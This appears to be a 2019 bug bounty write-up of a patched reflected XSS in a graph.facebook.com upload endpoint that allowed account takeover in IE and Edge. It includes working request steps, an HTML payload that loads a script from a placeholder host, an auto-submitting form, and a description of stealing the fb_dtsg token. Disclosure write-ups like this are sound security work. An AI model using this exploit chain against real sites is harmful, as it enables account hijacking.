---
id: 343
title: 'Reflected XSS in graph.facebook.com leads to account takeover in IE/Edge'
date: '2019-11-27T14:26:35+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=343'
categories:
    - Uncategorized
---

**Description**

This bug could allowed an attacker to takeover Facebook accounts by making a victim visit his website. This bug works for specific browsers only which are IE and Edge.  The main problem is that some API endpoint in graph.facebook.com didn’t escape HTML code before returning it in response. The response was in JSON format and the html code was included as value of one of the fields and the response didn’t contain Content-Type or X-Content-Type-Options headers which allowed me to execute code in IE/Edge ( In those browsers, they scan the full page to determine the MIME type but in others, they check first characters only)

**Demonstration**

1\) First , we send a POST request to:

POST /app/uploads  
Host: graph.facebook.com   
  
access_token=ACCESS_TOKEN&amp;file_length=100&amp;file_type=PAYLOAD

  
where ACCESS_TOKEN is a valid user access token generated by a first party app like Facebook for Android

and PAYLOAD is the HTML code we want to insert and which will be executed later in the victim’s browser, here i noticed that the colon characher “:” was removed later from the payload so i just tried to load an external Javascript file which was possible because again no Content Security Policy “CSP” headers were present in the response:

 &lt;html&gt;&lt;body&gt;&lt;script src=//DOMAIN.com/script.js &gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

This request should return a string similar to this one which contains a “base64” encoded string containing our payload and a “signature” of that string

upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Ym9keT48c2NyaXB0IHNyYz0vL0RPTUFJTi5jb20vc2NyaXB0LmpzID48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==?sig=ARaCDqLfwoeI8V3s

  
  
2\) Using the same access_token, send a POST request using the previous string returned in the response:

https://graph.facebook.com/upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Ym9keT48c2NyaXB0IHNyYz0vL0RPTUFJTi5jb20vc2NyaXB0LmpzID48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==?sig=ARaCDqLfwoeI8V3s

This request should return the previous PAYLOAD unescaped.

3\) To exploit this, i created a simple page in my website which contained this simple script:

&lt;html&gt;   
 &lt;body&gt;   
 &lt;form action=”https://graph.facebook.com/upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Ym9keT48c2NyaXB0IHNyYz0vL0RPTUFJTi5jb20vc2NyaXB0LmpzID48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==?sig=ARaCDqLfwoeI8V3s&amp;access_token=MY_ACCESS_TOKEN” method=”POST”&gt;&lt;input name=”random_” value=”random”&gt;  
 &lt;input type=”submit” value=”Submit” /&gt;  
 &lt;/form&gt;  
 &lt;script type =”text/javascript “&gt;  
 document.forms\[0\].submit();  
 &lt;/script&gt;   
 &lt;/body&gt;  
 &lt;/html&gt;

This page contains a form that automatically submitted when visiting it, which will have the parameter access_token with my own access_token used to generate the upload string in step 1.   
This is an example response to this request:

{“h”:”2::&lt;html&gt;&lt;body&gt;&lt;script src=//DOMAIN.com/script.js &gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;:GVo0nVVSEBm2kCDZXKFCdFSlCSZjbugbAAAP:e:1571103112:REDACATED:REDACATED:ARCvdJWLVDpBjUAZzrg”}

the script in https://DOMAIN.com/script.js will simply demonstrate how i could steal the “fb_dtsg” CSRF token and then make requests to https://www.facebook.com/api/graphql/ endpoint to takeover the account by adding a phone number or an email ( of course requests to this endpoint from graph.facebook.com origin are accepted)

**The Fix**

The fix was to ensure the escaping of HTML code embedded in the file_type parameter in step 1 and add the “Content-type: application/json” header to every response to avoid these type of attacks in the future.

**Timeline**

Oct 10, 2019— Report Sent  
Oct 10, 2019 — Acknowledged by Facebook  
Oct 11, 2019 — Fixed by Facebook  
Oct 24, 2019 — 5000$ Bounty Awarded by Facebook